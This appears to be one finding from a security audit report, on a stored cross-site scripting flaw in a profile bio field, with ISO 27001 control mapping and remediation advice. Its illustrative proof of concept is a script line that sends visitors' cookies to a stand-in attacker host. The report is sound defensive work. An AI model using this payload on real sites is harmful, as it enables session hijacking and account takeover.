# Finding 02: Stored Cross-Site Scripting (XSS)

## Severity: High (CVSS 7.6)

## Vulnerability Description

The comment/profile bio field does not sanitize or encode user-supplied input before storing and rendering it back to other users. An attacker can inject malicious JavaScript that executes in the browser of any user who views the affected page, since the payload is persisted (stored) rather than reflected once.

## Technical Details

- **Affected Component:** User profile bio / comment field
- **Attack Vector:** Lack of output encoding and input sanitization on user-supplied content rendered in HTML context
- **Proof of Concept (illustrative):** Submitting `<script>document.location='https://attacker.example/steal?c='+document.cookie</script>` into the bio field, which executes for every subsequent visitor to that profile
- **CWE Reference:** CWE-79 (Improper Neutralization of Input During Web Page Generation)

## ISO 27001 Annex A Control Mapping

- **Primary Control:** A.8.28 — Secure Coding
  Output encoding and input sanitization are core secure coding practices that were not applied.
- **Secondary Control:** A.8.26 — Application Security Requirements
  Application security requirements should have specified handling of user-generated content before development began.

## Business Risk Statement

Because the payload persists and executes for every visitor, this enables session hijacking, credential theft via fake login prompts, or account takeover at scale — without needing to target individual users. Any user who views the affected profile or page is automatically exposed, which makes this significantly more dangerous than a one-off reflected XSS.

## Risk Priority Rating

| Factor | Rating |
|---|---|
| Technical Severity (CVSS) | High (7.6) |
| Business Impact | High — session hijacking, account takeover at scale |
| Exploitability | Medium — requires a victim to view the affected page, no auth bypass needed |
| **Overall Priority** | **High — remediate within 1 week** |

## Recommended Remediation

- Apply context-aware output encoding wherever user input is rendered (HTML entity encoding at minimum)
- Implement a Content Security Policy (CSP) to limit script execution sources as a defense-in-depth measure
- Validate and sanitize input server-side; do not rely on client-side filtering alone
- Add this vulnerability class to automated security testing in the CI/CD pipeline
- Conduct a retest after remediation to confirm the fix
